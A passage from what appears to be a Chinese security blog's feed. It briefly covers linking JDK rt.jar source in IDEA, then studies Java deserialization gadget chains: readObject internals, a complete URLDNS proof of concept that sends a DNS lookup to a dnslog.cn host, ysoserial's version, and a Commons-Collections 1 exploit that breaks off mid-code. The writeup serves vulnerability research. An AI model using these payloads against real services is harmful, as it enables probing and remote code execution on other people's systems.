src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513150912940.png" alt="image-20210513150912940"></p><p>也就是说，IDEA无法帮我们搜索的内容，我们现在可以自己添加进去了。</p><p>如何关联？</p><p>来到Project Structure - SKDs，把我们的源码的classes添加进去就可以了</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151529264.png" alt="image-20210513151529264"></p><p>这次再搜索一下，直接find in path 搜索path</p><p>就可以看到了：</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513151800556.png" alt="image-20210513151800556"></p><p>翻出了JD-GUI，比较一下。</p><p>我是直接来到$JAVA_HOME，进入jre/lib，这些东西会参与java-runtime</p><p>啪的一下很快奥！</p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152337666.png" alt="image-20210513152337666"></p><p><img src="../images/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/image-20210513152445982.png" alt="image-20210513152445982"></p><p>不得不佩服西方老师傅门的耐心，漏洞在牛角尖上。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://my.oschina.net/u/2518341/blog/1931088" target="_blank" rel="noopener">获取openJDK源码</a></p><p><a href="https://www.jianshu.com/p/96334b23f4f0" target="_blank" rel="noopener">JDK（rt.jar）源码和IDE关联</a></p><p><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">http://hg.openjdk.java.net/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;独立三边静，轻生一剑知。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;记录一次对线rt.jar的经历。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java代码审计" scheme="https://0range228.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="实战记录" scheme="https://0range228.github.io/tags/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化利用链补全计划</title>
    <link href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/"/>
    <id>https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/</id>
    <published>2021-05-11T08:19:57.000Z</published>
    <updated>2021-07-19T11:50:37.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>温故而知新。</p></blockquote><p>站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。</p><p>同步项目：<a href="https://github.com/0range228/Gadgets" target="_blank" rel="noopener">Gadgets</a>     </p><a id="more"></a><h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>Java反序列化RCE三要素：<strong>readobject反序列化利用点 + 利用链 + RCE触发点</strong>。</p><p>审计maven仓库里面的jar包时，记得先拿到源码：</p><ul><li>点右上角download source </li><li>下载pom.xml里面声明的依赖jars：mvn dependency:resolve -Dclassifier=sources</li><li>JD-GUI </li><li>…</li></ul><h1 id="readObject源码分析"><a href="#readObject源码分析" class="headerlink" title="readObject源码分析"></a>readObject源码分析</h1><p>梦开始的地方。</p><p>正常使用反序列化，就会执行java.io.ObjectInputStream类中的readObejct方法。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511172731640.png" alt="image-20210511172731640"></p><p><strong>重点分析readObject0方法，它是核心方法。</strong>跟进去看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511173117069.png" alt="image-20210511173117069"></p><p>这里最重要的是进行了对象类型的选择，根据不同类型执行操作。</p><p>这里会先执行readOrdinaryObject方法，unshared是false。</p><p>进去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511174136473.png" alt="image-20210511174136473"></p><p>看到点眉目了，<strong>readSerialData其实才是真正反序列化对象</strong>，进入readSerialData函数看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511192758582.png" alt="image-20210511192758582"></p><p>到这里，可以理清整个过程的关键步骤了。</p><p>在readSerialData中比较关键的是这个判断条件：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511175925746.png" alt="image-20210511175925746"></p><p>其中slotDesc.hasReadObjectMethod()获取的是readObjectMethod这个属性，<strong>如果反序列化的类没有重写readobject()，那么readObjectMethod这个属性就是空</strong>，如果这个类重写了readobject()，就会执行readObject()方法。</p><p>所以这也就是为什么，挖掘这类漏洞，上来第一件事就是要：<strong>找到哪些类有重写readObject()方法</strong>。</p><p><strong>2021.5.24更新</strong></p><p>最近发现有个神奇的方法<code>defaultReadObject</code></p><p>他的javadoc如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155157492.png" alt="image-20210524155157492"></p><p>前面写到：</p><blockquote><p>读取非静态和非transient修饰的属性，并且只能被readObject方法调用</p></blockquote><p>懵懵的，写个demo实验一下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155558480.png" alt="image-20210524155558480"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524155522930.png" alt="image-20210524155522930"></p><p>会输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello，world！</span><br></pre></td></tr></table></figure><p>可以看到，Example类自己实现了readObject方法，并且在它内部还有一个<code>defaultReadObject</code>方法。</p><p>我们把它删掉会怎样？</p><p>答：这次输出是null，也就是s属性没有被序列化出来</p><p>所以<code>defaultReadObject</code>的作用就是执行流中对象默认的readObject方法，将对象的field反序列化出来。</p><p>还发现一个细节，为什么defaultReadObject的参数是一个ObjectInputStream参数？</p><p>看下图，是因为如果一个类自己实现了readObject方法，内部机制会invoke这个方法，参数就是当前流。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210524160113446.png" alt="image-20210524160113446"></p><p>一句话总结，<code>defaultReadObject</code>方法一般用于自己实现的readObject方法中，需要一个流对象作为参数。</p><p>用来执行流中对象默认的readObject方法，将对象反序列化出来。</p><p>如果我们自定义序列化过程仅仅调用了这个方法而没有任何额外的操作，这其实和默认的序列化过程没任何区别。</p><p>多说几句：</p><p>有了defaultReadObject方法之后，就可以用户自主控制反序列化过程了。</p><p>比如说一个字段是加密的，我们可以在readObject方法中先调用defaultReadObject方法来将其他字段来正常反序列化出来，再在最后执行加密字段的追加append。</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><blockquote><p>readobject反序列化利用点 + DNS查询，主要用来确认反序列化漏洞利用点的存在。</p></blockquote><p>最适合新手分析的反序列化链。ysoserial的一部分。</p><p>只依赖原生类，没有jdk版本限制。</p><p>dnslog平台可以选择：<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLog.cn</a>，<a href="http://ceye.io" target="_blank" rel="noopener">ceye</a>，我选择了DNSLog。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>jdk版本：jdk8u162，网上PoC很多，这里用<a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>师傅的为例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//0x01.生成payload</span></span><br><span class="line">        <span class="comment">//设置一个hashMap</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        <span class="comment">//设置我们可以接受DNS查询的地址</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://oh6pfs.dnslog.cn"</span>);</span><br><span class="line">        <span class="comment">//将URL的hashCode字段设置为允许修改</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span></span><br><span class="line">        <span class="comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        <span class="comment">//2. 将url放入hashMap中，右边参数随便写</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        <span class="comment">//修改url的hashCode字段为-1，为了触发DNS查询</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//0x02.写入文件模拟网络传输</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        <span class="comment">//0x03.读取文件，进行反序列化触发payload</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功触发dns查询记录：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511165114468.png" alt="image-20210511165114468"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>三要素：HashMap / URL / HashCode</p><p>大体流程：</p><ol><li>new一个HashMap对象，key-value对为URL-String类型，key设置为我们的dnslog的地址</li><li>暴力反射，将URL类的hashCode字段改为public，默认是private</li><li>将url对象的hashCode字段随便改成一个值</li><li>将url对象放入HashMap中作为key，value也随便写一个</li><li>将f对象的hashCode字段改为-1，<strong>触发漏洞</strong></li></ol><p>最终的payload结构是 一个HashMap，里面包含了 一个修改了hashCode为-1的URL类对象。</p><p><strong>由于HashMap类自己有实现readObject方法，那么在反序列化过程中就会执行他自己的readObject。</strong></p><h3 id="搞懂HashMap"><a href="#搞懂HashMap" class="headerlink" title="搞懂HashMap"></a>搞懂HashMap</h3><blockquote><p><strong>HashMap 可以看作是一个链表散列的数据结构 , 也就是数组和链表的结合体.</strong></p></blockquote><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511193717145.png" alt="image-20210511193717145"></p><p>对于主干来说，当要存放一个entry的时候，步骤如下：</p><ol><li>计算key的hash：hash(k)</li><li>通过hash(k)映射到有限的数组a的位置i</li><li>在a[i]的位置存入value</li></ol><p>自然就会想到，<strong>如果哈希冲突了怎么办？</strong>HashMap对于不同的元素，如果hash值相同，会采用链表指针的方式来挂在后面。</p><blockquote><p><strong>HashMap的主干是一个Entry数组</strong>，主干数组的长度一定是2的次幂。</p><p>Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。（其实所谓Map其实就是保存了两个对象之间的映射关系的一种集合）</p></blockquote><p>看源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jdk7</span></span><br><span class="line"><span class="keyword">transient</span> Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Entry是HashMap中的一个静态内部类。</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> K key;</span><br><span class="line">  V value;</span><br><span class="line">  Entry&lt;K,V&gt; next;<span class="comment">//存储指向下一个Entry的引用，单链表结构</span></span><br><span class="line">  <span class="keyword">int</span> hash;<span class="comment">//对key进行hash运算后得到的值，存储在Entry中，避免重复计算</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Creates new entry.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  Entry(<span class="keyword">int</span> h, K k, V v, Entry&lt;K,V&gt; n) &#123;</span><br><span class="line">    value = v;</span><br><span class="line">    next = n;</span><br><span class="line">    key = k;</span><br><span class="line">    hash = h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看图：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511195908151.png" alt="image-20210511195908151"></p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><p>看源码（跳过一些初始化操作）：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201023679.png" alt="image-20210511201023679"></p><p>putVal是向Map存放Entry的操作，在放入时会计算<strong>key的hash</strong>作为转化为数组位置<strong>i</strong>的映射依据。</p><p><strong>DNS查询正是在计算URL类的对象的hash的过程中触发的</strong>，即<strong>hash(key)</strong>。</p><p>看hash()方法源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201250404.png" alt="image-20210511201250404"></p><p>不同对象的hash计算方法是在各自的类中实现的，如果传入的key是一个URL对象，这里key.hashCode()就会调用URL类中的hashCode方法：java.net.URL#hashCode。</p><p>java.net.URL#hashCode 源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511201521952.png" alt="image-20210511201521952"></p><p>仔细看，用到了两个field：</p><blockquote><p><strong>transient</strong> URLStreamHandler handler;  // handler是一个transient临时类型，它不会被反序列化（但之后会用到）</p><p><strong>private</strong> <strong>int</strong> hashCode = -1;   //hashCode是private类型，需要手动开放控制权才可以修改。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//如果hashCode不为-1，直接返回hashCode的值</span></span><br><span class="line">  <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line"><span class="comment">//如果hashCode为-1，直接计算handler的hashcode，并返回</span></span><br><span class="line">  hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就继续看handler所属的类：URLStreamHandler</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511204935728.png" alt="image-20210511204935728"></p><p>getHostAddress也是限制了IP地址不会解析：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511205231393.png" alt="image-20210511205231393"></p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511231600583.png" alt="image-20210511231600583" style="zoom:50%;"><p>这里面必须提一下上面的hostAddress参数，<strong>如果 Host 字段为一个域名 , 且我们之前解析过这个域名 , 那么程序会将解析后的 IP 地址缓存到 hostAddress 参数中 , 当我们再次请求时 , 由于 hostAddress 已有值 , 就不会走完剩下的 POP Chain 了。</strong></p><p>继续跟，会到java.net.InetAddress#getAllByName()这个方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232113101.png" alt="image-20210511232113101" style="zoom:50%;"><p>进入getAllByName0:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232345462.png" alt="image-20210511232345462"></p><p><strong>总结一下到目前为止可以利用的调用链</strong>：</p><ol><li>HashMap.readObject() -&gt; HashMap.hash() </li><li>HashMap.hash() -&gt; URL.hashCode()</li><li>URL.hashCode() -&gt; URLStreamHandler.hashCode()</li><li>URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress()</li><li>URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName() -&gt; … -&gt; getAddressFromNameService()</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>满足两个条件：</p><ol><li>为了能走到URL.hashCode()，要保证map里面存放着一个Entry，这个Entry的key满足URL类型</li><li>为了能走到URLStreamHandler.hashCode()，需要hashCode这个field为-1，绕过if判断</li></ol><p>往前翻PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>为什么这里首先给url的hashCode属性先设置成一个值，put到map之后，再改成另一个值？</strong></p><p>这里我们先做一件事，看一下之前提到的HashMap.readObject()方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000356313.png" alt="image-20210512000356313"></p><p>这里面的s其实是ObjectInputStream对象。既然key和value都是从s.readObejct()方法出来的(之后进行了cast强转)，那我们先看一下对应的HashMap.writeObject方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000617960.png" alt="image-20210512000617960" style="zoom:50%;"><p>跟到internalWriteEntries方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000702874.png" alt="image-20210512000702874" style="zoom:50%;"><p>可以看到，分别对entry内部的key和value进行了writeObject，tab的值即HashMap中table的值，也就是横向数组。</p><p>想一下，如果你想向一个HashMap中存放一个entry，那么就要执行HashMap.put()方法：</p><p>再看一下HashMap的put方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511224336952.png" alt="image-20210511224336952"></p><p>可以看到，这里用到了HashMap.hash()方法，如果这里面的key就是URL，那么后续利用链就能接上。</p><p>也就是说，<strong>仅仅一次put操作，就会触发一次DNS查询</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(your_dns_url);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时就会产生一次dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以回答之前的问题：</p><p><strong>为什要改两次，因为我们要规避掉put操作产生的DNS查询。</strong></p><p>之后再改回-1，是为了可以成功触发反序列化时候的漏洞。</p><p>也就是这里还有一条小链：</p><blockquote><p>HashMap.put() -&gt; HashMap.hash() </p><p>HashMap.hash() -&gt; URL.hashCode()</p><p>…</p><p>触发DNS查询</p></blockquote><h2 id="ysoserial实现版本"><a href="#ysoserial实现版本" class="headerlink" title="ysoserial实现版本"></a>ysoserial实现版本</h2><p>十分优雅</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003551060.png" alt="image-20210512003551060"></p><p>这里首先有一个SilentURLStreamHandler对象，跟进去看看：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003709417.png" alt="image-20210512003709417" style="zoom:50%;"><p>可以发现这个类其实就是继承URLStreamHandler类，并且把这两个方法改成了返回null，这样就规避了在生成payload的时候的那一次DNS查询，也就是我们之前看到的HashMap.put的那次操作。</p><p>这次put的时候，由于handler是SilentURLStreamHandler类，完全不会出发DNS解析，实在是妙。</p><h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons-Collections"></a>Commons-Collections</h1><p>“不是夸你们Oracle呢，CC链确实让我们没饿死”</p><p>这里主要是ysoserial已经有的cc1-7漏洞，以及记录一些其他师傅们发现的。</p><p>cc的背景可以去看之前的<a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/">文章</a>温习。</p><h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>条件：</p><ul><li><p><strong>cc3.1～3.2.1</strong></p></li><li><p><strong>jdk 1.7</strong>(8u71之前都可以)</p></li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><ul><li><a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">动态代理</a>，一句话总结就是：<strong>动态代理直接调用接口的方法，无需实现类</strong>。</li><li><a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/">反射</a></li></ul><p>主流两个版本：TransformedMap，LazyMap</p><h3 id="TransformedMap版本"><a href="#TransformedMap版本" class="headerlink" title="TransformedMap版本"></a>TransformedMap版本</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span 